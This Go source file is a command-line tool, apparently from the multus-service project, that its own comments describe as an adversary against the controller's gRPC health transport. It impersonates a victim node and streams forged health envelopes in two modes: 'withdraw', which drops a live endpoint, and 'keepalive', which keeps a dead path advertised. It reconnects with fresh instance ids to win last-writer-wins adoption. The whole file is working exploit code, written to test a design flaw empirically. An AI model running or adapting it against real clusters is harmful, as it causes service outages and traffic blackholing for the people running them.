// Command spoof is an adversary against the secondary-endpoint health transport.
//
// It is NOT a test harness. It models the threat the split-authority design has
// to answer: an ordinary workload with cluster network reachability to the
// controller's gRPC Service, holding no agent credential, forging health
// evidence for another node's endpoint.
//
// It exists to answer one question empirically -- can unauthenticated,
// self-asserted health evidence change what a Service resolves to? Everything
// it needs about the victim (attachment id, node, address) is derivable from
// objects any namespaced reader can see, so possessing them is not privilege.
//
// Two attacks:
//
//	withdraw   forge local_ready=false for a live endpoint  -> availability loss
//	keepalive  forge local+path ready=true for a dead path  -> traffic blackhole
//
// Both rest on the same flaw: the controller trusts the node name in the
// envelope, and the newest stream to (re)adopt a node wins. An attacker that
// reconnects faster than the real agent notices it was superseded stays
// authoritative for that node.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"time"

	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/grpc/credentials/insecure"

	healthpb "github.com/boanlab/multus-service/api/healthpb"
)

// bearer attaches a token file as a bearer credential, for the attacker variant
// that possesses a valid but non-agent token.
type bearer struct {
	path string
	tls  bool
}

func (b bearer) GetRequestMetadata(context.Context, ...string) (map[string]string, error) {
	t, err := os.ReadFile(b.path)
	if err != nil {
		return nil, err
	}
	return map[string]string{"authorization": "Bearer " + string(t)}, nil
}
func (b bearer) RequireTransportSecurity() bool { return b.tls }

func main() {
	var (
		addr       = flag.String("addr", "", "controller health transport host:port")
		node       = flag.String("node", "", "victim node name to impersonate")
		attID      = flag.String("attachment", "", "victim attachment id")
		nad        = flag.String("nad", "", "victim canonical ns/name")
		iface      = flag.String("interface", "", "victim interface name")
		ip         = flag.String("ip", "", "victim address")
		attack     = flag.String("attack", "", "withdraw | keepalive")
		caPath     = flag.String("ca", "", "controller CA for TLS; empty dials plaintext")
		serverName = flag.String("server-name", "", "TLS server name to verify")
		tokenPath  = flag.String("token", "", "bearer token file; empty sends none")
		duration   = flag.Duration("duration", 30*time.Second, "how long to sustain the attack")
		sendEvery  = flag.Duration("send-interval", 100*time.Millisecond, "forged report cadence")
		instanceID = flag.String("instance", "attacker", "instance id base")
	)
	flag.Parse()
	dialCA, dialSN, dialTok = *caPath, *serverName, *tokenPath
	for name, v := range map[string]string{"addr": *addr, "node": *node, "attachment": *attID,
		"nad": *nad, "interface": *iface, "ip": *ip, "attack": *attack} {
		if v == "" {
			fmt.Fprintf(os.Stderr, "--%s is required\n", name)
			os.Exit(2)
		}
	}

	var localReady, pathReady bool
	switch *attack {
	case "withdraw":
		localReady, pathReady = false, false // any false term withdraws the endpoint
	case "keepalive":
		localReady, pathReady = true, true // outvote the real agent's failure report
	default:
		fmt.Fprintf(os.Stderr, "unknown --attack %q\n", *attack)
		os.Exit(2)
	}

	ctx, cancel := context.WithTimeout(context.Background(), *duration)
	defer cancel()

	local := &healthpb.LocalHealth{
		AttachmentId: *attID, Nad: *nad, InterfaceName: *iface, Ip: *ip,
		LocalReady: localReady, InterfaceExists: localReady,
		AddressPresent: localReady, LinkUsable: localReady,
	}
	path := &healthpb.PathHealth{
		Scope:   healthpb.ProbeScope_PROBE_SCOPE_ENDPOINT,
		ScopeId: *attID, Nad: *nad, Target: "forged", PathReady: pathReady,
	}

	sends, accepted, epoch := 0, 0, 0
	for ctx.Err() == nil {
		epoch++
		// A fresh instance every reconnect. Adoption is last-writer-wins on the
		// node string, so reconnecting is how the attacker reclaims authority
		// after the real agent briefly supersedes it.
		inst := fmt.Sprintf("%s-%d", *instanceID, epoch)
		s, ok := session(ctx, *addr, *node, inst, local, path, *sendEvery, &sends, &accepted)
		if !ok {
			// dial failed; back off a touch and retry
			select {
			case <-ctx.Done():
			case <-time.After(200 * time.Millisecond):
			}
		}
		_ = s
	}
	fmt.Printf("attack=%s sends=%d accepted_acks=%d\n", *attack, sends, accepted)
}

// session opens one stream and keeps forging until it breaks or ctx ends.
var dialCA, dialSN, dialTok string

func session(ctx context.Context, addr, node, inst string,
	local *healthpb.LocalHealth, path *healthpb.PathHealth,
	every time.Duration, sends, accepted *int) (bool, bool) {

	var opts []grpc.DialOption
	if dialCA != "" {
		tc, err := credentials.NewClientTLSFromFile(dialCA, dialSN)
		if err != nil {
			return false, false
		}
		opts = append(opts, grpc.WithTransportCredentials(tc))
	} else {
		opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
	}
	if dialTok != "" {
		opts = append(opts, grpc.WithPerRPCCredentials(bearer{path: dialTok, tls: dialCA != ""}))
	}
	conn, err := grpc.NewClient(addr, opts...)
	if err != nil {
		return false, false
	}
	defer conn.Close()

	stream, err := healthpb.NewHealthReporterClient(conn).Sync(ctx)
	if err != nil {
		return false, false
	}

	go func() {
		for {
			if _, err := stream.Recv(); err != nil {
				return
			}
			*accepted++
		}
	}()

	var seq uint64
	send := func(p any) error {
		seq++
		e := &healthpb.HealthEnvelope{NodeName: node, AgentInstanceId: inst, Sequence: seq}
		switch v := p.(type) {
		case *healthpb.LocalHealth:
			e.Payload = &healthpb.HealthEnvelope_Local{Local: v}
		case *healthpb.PathHealth:
			e.Payload = &healthpb.HealthEnvelope_Path{Path: v}
		}
		return stream.Send(e)
	}

	t := time.NewTicker(every)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return true, true
		case <-t.C:
			local.ObservedAtUnixNano = time.Now().UnixNano()
			path.ObservedAtUnixNano = time.Now().UnixNano()
			if send(local) != nil {
				return true, false
			}
			if send(path) != nil {
				return true, false
			}
			*sends += 2
		}
	}
}
